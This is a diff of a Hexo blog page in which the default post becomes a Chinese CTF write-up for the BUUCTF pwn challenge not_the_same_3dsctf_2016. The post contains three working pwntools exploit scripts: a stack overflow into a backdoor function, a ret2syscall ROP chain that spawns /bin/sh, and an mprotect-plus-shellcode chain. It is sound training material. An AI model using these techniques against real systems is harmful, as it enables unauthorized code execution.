@@ -16,23 +16,27 @@
   <meta name="author" content="TKYmax">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="not_the_same_3dsctf_2016查看保护就不说了 IDA反编译发现为静态编译，不用找libc了这点节省不少功夫。打开main函数，发现栈溢出漏洞偏移为45，这个是根据gdb的cyclic算出来的发现后门函数get_secret，功能是把flag读取赋值给fl4g初步思路为通过栈溢出，调用get_secret，再通过write函数读取fl4g 方法一 通过栈溢出调用后门函数12345">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://example.com/2024/07/18/hello-world/index.html">
+<meta property="og:title" content="not_the_same_3dsctf_2016">
+<meta property="og:url" content="http://example.com/2024/07/18/not-the-same-3dsctf-2016/index.html">
 <meta property="og:site_name" content="能打八个攻城狮">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="not_the_same_3dsctf_2016查看保护就不说了 IDA反编译发现为静态编译，不用找libc了这点节省不少功夫。打开main函数，发现栈溢出漏洞偏移为45，这个是根据gdb的cyclic算出来的发现后门函数get_secret，功能是把flag读取赋值给fl4g初步思路为通过栈溢出，调用get_secret，再通过write函数读取fl4g 方法一 通过栈溢出调用后门函数12345">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/image-20240718185738048.png">
-<meta property="article:published_time" content="2024-07-18T10:37:35.300Z">
-<meta property="article:modified_time" content="2024-07-18T11:11:55.033Z">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/-3dsctf-2016/3340174-20240709150106100-1584911977.png">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/-3dsctf-2016/3340174-20240709150247577-737536292.png">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/-3dsctf-2016/3340174-20240709150422799-300419962.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3340174/202407/3340174-20240709151700303-272022987.png">
+<meta property="article:published_time" content="2024-07-18T08:18:53.000Z">
+<meta property="article:modified_time" content="2024-07-18T13:39:23.111Z">
 <meta property="article:author" content="TKYmax">
+<meta property="article:tag" content="mprotect">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2024/07/18/hello-world/image-20240718185738048.png">
+<meta name="twitter:image" content="http://example.com/2024/07/18/hello-world/-3dsctf-2016/3340174-20240709150106100-1584911977.png">
   
   
   
-  <title>Hello World - 能打八个攻城狮</title>
+  <title>not_the_same_3dsctf_2016 - 能打八个攻城狮</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -225,7 +229,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World"></span>
+            <span id="subtitle" data-typed-text="not_the_same_3dsctf_2016"></span>
           
         </div>
 
@@ -236,8 +240,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-07-18 18:37" pubdate>
-          2024年7月18日 晚上
+        <time datetime="2024-07-18 16:18" pubdate>
+          2024年7月18日 下午
         </time>
       </span>
     
@@ -248,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          18 字
+          523 字
         
       </span>
     
@@ -259,7 +263,7 @@
         
         
         
-          1 分钟
+          5 分钟
         
       </span>
     
@@ -296,26 +300,21 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Hello World</h1>
+            <h1 id="seo-header">not_the_same_3dsctf_2016</h1>
             
             
               <div class="markdown-body">
                 
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-<p><img src="/2024/07/18/hello-world/image-20240718185738048.png" srcset="/img/loading.gif" lazyload alt="image-20240718185738048"></p>
-
+                <h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p><strong>查看保护就不说了</strong><br><img src="/2024/07/18/hello-world/-3dsctf-2016/3340174-20240709150106100-1584911977.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>IDA反编译发现为静态编译，不用找libc了这点节省不少功夫。打开main函数，发现栈溢出漏洞</strong><br><img src="/2024/07/18/hello-world/-3dsctf-2016/3340174-20240709150247577-737536292.png" srcset="/img/loading.gif" lazyload><br><strong>偏移为45，这个是根据gdb的cyclic算出来的</strong><br><strong>发现后门函数get_secret，功能是把flag读取赋值给fl4g</strong><br><img src="/2024/07/18/hello-world/-3dsctf-2016/3340174-20240709150422799-300419962.png" srcset="/img/loading.gif" lazyload><br><strong>初步思路为通过栈溢出，调用get_secret，再通过write函数读取fl4g</strong></p>
+<h2 id="方法一-通过栈溢出调用后门函数"><a href="#方法一-通过栈溢出调用后门函数" class="headerlink" title="方法一 通过栈溢出调用后门函数"></a>方法一 通过栈溢出调用后门函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>write_addr = <span class="hljs-number">0x806E270</span><br>flag_addr = <span class="hljs-number">0x080ECA2D</span><br>target = <span class="hljs-number">0x080489A0</span><br>exit_addr = <span class="hljs-number">0x0804E660</span><br><br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(target)<br>payload += p32(elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(exit_addr)<br>payload += p32(<span class="hljs-number">1</span>) + p32(flag_addr) + p32(<span class="hljs-number">42</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p><strong>我们前面分析这个是静态编译，我们可以直接ret2syscall，通过设置寄存器的值，直接获得shell</strong></p>
+<h2 id="方法二-ret2syscall"><a href="#方法二-ret2syscall" class="headerlink" title="方法二 ret2syscall"></a>方法二 ret2syscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br><span class="hljs-comment">#gdb.attach(p , &#x27;b * 0x080489EA&#x27;)</span><br><span class="hljs-comment">#0x08048b0b : pop eax ; ret</span><br>pop_eax = <span class="hljs-number">0x08048b0b</span><br><span class="hljs-comment">#0x0806fcc9 : pop ebx ; pop edx ; ret</span><br>pop_ebx_edx = <span class="hljs-number">0x0806fcc9</span><br><span class="hljs-comment">#0x0806fcf1 : pop ecx ; pop ebx ; ret</span><br>pop_ecx_ebx = <span class="hljs-number">0x0806fcf1</span><br><span class="hljs-comment">#0x0806d8a5 : int 0x80</span><br>int80_addr = <span class="hljs-number">0x0806d8a5</span><br>get_addr = <span class="hljs-number">0x0804F8D0</span><br>data_addr = <span class="hljs-number">0x080EBAD2</span><br>target = <span class="hljs-number">0x080489A0</span><br><span class="hljs-comment">#0x080481ad : pop ebx ; ret</span><br>pop1 = <span class="hljs-number">0x080481ad</span> <br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(get_addr) + p32(pop1) + p32(data_addr)<br>payload += p32(pop_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p32(pop_eax) + p32(<span class="hljs-number">11</span>)<br>payload += p32(pop_ebx_edx) + p32(data_addr) + p32(<span class="hljs-number">0</span>)<br>payload += p32(int80_addr)<br>payload += p32(target)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>这个看上去有点复杂但是，耐心看下来还是很好理解的，32位getshell需要调用execv&gt;（”&#x2F;bin&#x2F;sh”,null,null)，寄存器eax&#x3D;11，ebx&#x3D;”&#x2F;bin&#x2F;sh”，ecx&#x3D;0，edx&#x3D;0，然后再执行int 0x80</p>
+</blockquote>
+<p><strong>然后我们发现函数列表有mprotect,这个函数可以改变段的执行权限,我们可以开启最高权限,执行shellcode</strong><br><img src="https://img2024.cnblogs.com/blog/3340174/202407/3340174-20240709151700303-272022987.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="方法三-mprotect配合shellcode"><a href="#方法三-mprotect配合shellcode" class="headerlink" title="方法三 mprotect配合shellcode"></a>方法三 mprotect配合shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span> , log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mprotect_addr = <span class="hljs-number">0x0806ED40</span><br>pop3_ret = <span class="hljs-number">0x806fcc8</span><br>shellcode = asm(shellcraft.sh())<br>target = <span class="hljs-number">0x80ea000</span><br>binsh_addr = <span class="hljs-number">0x80ec000</span><br><br>payload =  <span class="hljs-number">0x2D</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(mprotect_addr) + p32(pop3_ret)<br>payload += p32(target) + p32(<span class="hljs-number">0x3000</span>) + p32(<span class="hljs-number">0x7</span>)<br>payload += p32(read_addr) + p32(pop3_ret)<br>payload += p32(<span class="hljs-number">0</span>) + p32(binsh_addr) + p32(<span class="hljs-built_in">len</span>(shellcode))<br>payload += p32(binsh_addr)<br><br>p.sendline(payload)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -323,6 +322,34 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/BUUCTF%E5%88%B7%E9%A2%98/" class="category-chain-item">BUUCTF刷题</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/mprotect/" class="print-no-link">#mprotect</a>
+      
+    </div>
   
 </div>
 
@@ -334,12 +361,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/" title="绕过保护之Canary">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">绕过保护之Canary</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/" title="绕过保护之Canary">
-                        <span class="hidden-mobile">绕过保护之Canary</span>
+                      <a href="/2024/07/18/%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/" title="用动态链接动态泄露system地址并利用">
+                        <span class="hidden-mobile">用动态链接动态泄露system地址并利用</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
